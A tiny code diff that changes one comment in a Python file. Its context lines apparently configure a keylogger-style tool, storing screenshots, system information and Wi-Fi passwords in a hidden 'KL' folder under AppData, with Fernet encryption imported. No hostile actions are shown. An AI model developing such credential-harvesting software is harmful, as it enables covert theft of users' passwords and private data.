@@ -1,7 +1,7 @@
 from cryptography.fernet import Fernet
 import os
 
-# Configuration
+# oath Configuration
 screenshot_folder = os.path.join(os.environ['appdata'], "KL")
 system_information = os.path.join(screenshot_folder, "systeminfo.txt")
 wifi_password = os.path.join(screenshot_folder, "wifi_password.txt")
